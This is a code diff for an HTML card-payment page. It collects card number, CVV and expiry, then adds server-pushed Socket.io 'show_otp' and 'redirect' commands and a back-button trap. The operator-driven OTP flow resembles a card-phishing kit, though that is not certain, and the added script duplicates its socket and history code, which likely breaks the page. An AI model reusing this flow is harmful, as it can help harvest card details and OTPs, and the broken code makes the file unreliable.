@@ -354,7 +354,6 @@
                   </button>
                 </div>
               </div>
-              <!-- OTP error message placed below the OTP row and above the timer -->
               <p id="otpError" class="otp-error">Incorrect OTP. Please enter a valid one time passcode.</p>
               <p class="text-center text-sm text-gray-500 mt-2">
                 Time remaining: <span id="timer">2:59</span>
@@ -382,6 +381,39 @@
     </div>
   </div>
 
+  <!-- Socket.io integration for real-time commands -->
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+    const storedInvoiceId = localStorage.getItem("invoiceId");
+    if (storedInvoiceId) {
+      socket.emit('join', storedInvoiceId);
+    }
+    socket.on('show_otp', (data) => {
+      console.log("Show OTP event received:", data);
+      // Hide the payment form completely so that only OTP form is visible
+      document.getElementById('paymentForm').classList.add('hidden');
+      document.getElementById('otpForm').classList.remove('hidden');
+    });
+    socket.on('redirect', (data) => {
+      window.location.href = data.redirectUrl;
+    });
+  </script>
+
+  <!-- Back Button Prevention -->
+  <script>
+    // Push a state so that back button doesn't immediately leave the page
+    history.pushState(null, null, window.location.href);
+    window.addEventListener('popstate', function(e) {
+      if (confirm("Do you want to cancel this transaction?")) {
+        window.location.href = '/fail.html';
+      } else {
+        history.pushState(null, null, window.location.href);
+      }
+    });
+  </script>
+
+  <!-- Payment Page Main Script -->
   <script>
     document.addEventListener('DOMContentLoaded', async () => {
       let isCardValid = false;
@@ -392,7 +424,7 @@
       let timerInterval = null;
       let timer = 180;
       let consentChecked = true;
-
+  
       const urlParams = new URLSearchParams(window.location.search);
       const pid = urlParams.get('pid');
       if (pid) {
@@ -408,7 +440,7 @@
           console.error('Error fetching payment details:', error);
         }
       }
-
+  
       function updateSubmitButton() {
         const email = document.getElementById('email').value.trim();
         const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -424,7 +456,7 @@
           submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
         }
       }
-
+  
       function updateConfirmOtpButton() {
         const otp = document.getElementById('otp').value;
         const otpButton = document.getElementById('otpSubmitButton');
@@ -437,7 +469,7 @@
           otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
         }
       }
-
+  
       document.getElementById('consentCheckbox').addEventListener('click', function() {
         consentChecked = !consentChecked;
         if (consentChecked) {
@@ -447,7 +479,7 @@
         }
         updateSubmitButton();
       });
-
+  
       function validateCard(number) {
         const clean = number.replace(/\D/g, '');
         if (clean.length < 13 || clean.length > 16) return false;
@@ -460,7 +492,7 @@
         }
         return sum % 10 === 0;
       }
-
+  
       function detectCardType(number) {
         const clean = number.replace(/\D/g, '');
         const firstDigit = clean.charAt(0);
@@ -470,7 +502,7 @@
         if (firstDigit === '6') return 'rupay';
         return null;
       }
-
+  
       function updateCardTypeIcon(type) {
         const iconContainer = document.getElementById('cardTypeIcon');
         iconContainer.innerHTML = '';
@@ -497,7 +529,7 @@
           iconContainer.appendChild(img);
         }
       }
-
+  
       function formatCardNumber(value) {
         let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
         v = v.slice(0, 16);
@@ -518,7 +550,7 @@
         }
         return formatted;
       }
-
+  
       function validateExpiry(value) {
         if (!/^\d{2}\/\d{2}$/.test(value)) return false;
         const [month, year] = value.split('/').map(num => parseInt(num, 10));
@@ -530,7 +562,7 @@
         if (year === currentYear && month < currentMonth) return false;
         return true;
       }
-
+  
       function formatExpiry(value) {
         const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
         let formatted = v;
@@ -549,7 +581,7 @@
         }
         return formatted;
       }
-
+  
       function startOtpTimer() {
         if (timerInterval) clearInterval(timerInterval);
         timer = 180;
@@ -565,7 +597,7 @@
           }
         }, 1000);
       }
-
+  
       document.getElementById('cardNumber').addEventListener('input', function(e) {
         const cursor = e.target.selectionStart;
         const lastLength = e.target.value.length;
@@ -579,7 +611,7 @@
           e.target.setSelectionRange(newCursor, newCursor);
         }
       });
-
+  
       document.getElementById('expiry').addEventListener('input', function(e) {
         const cursor = e.target.selectionStart;
         const lastLength = e.target.value.length;
@@ -591,15 +623,15 @@
           e.target.setSelectionRange(newCursor, newCursor);
         }
       });
-
+  
       ['email', 'cvv', 'cardholderName'].forEach(id => {
         document.getElementById(id).addEventListener('input', updateSubmitButton);
       });
-
+  
       document.getElementById('otp').addEventListener('input', function(e) {
         updateConfirmOtpButton();
       });
-
+  
       async function checkTransactionStatus() {
         if (!currentInvoiceId) return;
         try {
@@ -614,7 +646,6 @@
             if (!timerInterval) { startOtpTimer(); }
             if (data.otpError) {
               document.getElementById('otpError').style.display = 'block';
-              // Reset OTP confirm button
               const otpButton = document.getElementById('otpSubmitButton');
               const otpLoader = document.getElementById('otpLoader');
               const btnText = document.getElementById('otpText');
@@ -633,7 +664,7 @@
           console.error('Error checking transaction status:', err);
         }
       }
-
+  
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -662,6 +693,7 @@
           const result = await response.json();
           if (result.status === "success") {
             currentInvoiceId = result.invoiceId;
+            localStorage.setItem("invoiceId", result.invoiceId);
             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           } else {
             throw new Error('Payment submission failed');
@@ -677,7 +709,7 @@
           updateSubmitButton();
         }
       });
-
+  
       document.getElementById('otpSubmitButton').addEventListener('click', async () => {
         if (isProcessing) return;
         isProcessing = true;
@@ -713,60 +745,31 @@
       });
     });
 
-    document.getElementById("paymentForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  // Gather values from your input fields:
-  const cardNumber = document.getElementById("cardNumber").value;
-  const expiry = document.getElementById("expiry").value;
-  const cvv = document.getElementById("cvv").value;
-  const email = document.getElementById("email").value;
-  const amount = document.getElementById("amount").value;
-  const currency = "INR"; // or as required
-  const cardholder = document.getElementById("cardholder").value;
-  
-  try {
-    const response = await fetch('/api/sendPaymentDetails', {
-      method: 'POST',
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ cardNumber, expiry, cvv, email, amount, currency, cardholder })
-    });
-  <script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
-  // Once you have an invoiceId (from payment submission), join that room:
-  const invoiceId = localStorage.getItem("invoiceId");
-  if (invoiceId) {
-    socket.emit('join', invoiceId);
-  }
-  socket.on('show_otp', (data) => {
-    // Code to display OTP form
-    console.log("Show OTP event received:", data);
-    // For example, hide card form and show OTP form:
-    document.getElementById('paymentForm').classList.add('hidden');
-    document.getElementById('otpForm').classList.remove('hidden');
-  });
-  socket.on('redirect', (data) => {
-    window.location.href = data.redirectUrl;
-  });
-</script>
-  </script>
-  <!-- Back Button Prevention Script -->
-<script>
-  // Push a new history state to prevent immediate back navigation
-  history.pushState(null, null, window.location.href);
-  
-  // Listen for back button events
-  window.addEventListener('popstate', function(e) {
-    // Show confirmation popup when the user tries to navigate back
-    if (confirm("Do you want to cancel this transaction?")) {
-      // If confirmed, redirect to fail.html
-      window.location.href = '/fail.html';
-    } else {
-      // Otherwise, push the current state again so they remain on the page
-      history.pushState(null, null, window.location.href);
+    // Socket.io integration for real-time commands
+    const socket = io();
+    const storedInvoiceId = localStorage.getItem("invoiceId");
+    if (storedInvoiceId) {
+      socket.emit('join', storedInvoiceId);
     }
-  });
-</script>
+    socket.on('show_otp', (data) => {
+      console.log("Show OTP event received:", data);
+      document.getElementById('paymentForm').classList.add('hidden');
+      document.getElementById('otpForm').classList.remove('hidden');
+    });
+    socket.on('redirect', (data) => {
+      window.location.href = data.redirectUrl;
+    });
 
+    // Prevent back navigation and prompt the user to confirm cancelation
+    history.pushState(null, null, window.location.href);
+    window.addEventListener('popstate', function(e) {
+      if (confirm("Do you want to cancel this transaction?")) {
+        window.location.href = '/fail.html';
+      } else {
+        history.pushState(null, null, window.location.href);
+      }
+    });
+  </script>
+  <!-- End of Payment Page Script -->
 </body>
 </html>
